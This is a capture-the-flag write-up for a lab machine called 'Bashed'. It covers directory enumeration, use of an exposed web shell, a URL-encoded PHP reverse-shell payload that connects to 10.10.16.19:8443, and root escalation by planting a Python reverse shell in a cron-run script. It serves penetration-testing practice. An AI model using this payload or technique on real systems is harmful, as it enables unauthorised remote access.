Bashed

Target IP: 10.129.68.60

Scanning


There is only one TCP port open on the target machine: HTTP at port 80.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application.


Performing a directory search using the command gobuster dir -u http://10.129.148.117/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt shows the interesting result above.


Browsing to /dev contains interesting PHP files. Are these web-shell files?


Looks like we can use the webshell to perform command execution on the machine. Time to exploit this machine.

Exploitation


I started a listener on 8443 and sent a PHP reverse shell connection script using the web-shell. Then I received a connection on my local machine port 8443. Now I have a foothold on the machine.

Payload used: php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.16.19%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.

Privilege Escalation


Running sudo -l shows scriptmanager can execute any commands without password. Using sudo -u scriptmanager bash, I spawned a bash shell as the new user.


There is an interesting directory called scripts.


This directory contains two files: test.py and test.txt.


Looks like the first file gets executed every minute by root or any files with .py extension. I can put my reverse shell inside test.py.

!

I put the Python reverse shell script inside test.py and transferred it to the target machine. I changed the permission to be executable. After, I started a listener on port 8444. And after a minute, I got a reverse shell connection from the target machine to my port 8444!

Flags


The user.txt flag once I gained a foothold on the machine.


The root.txt flag once I gained a reverse root shell connection.
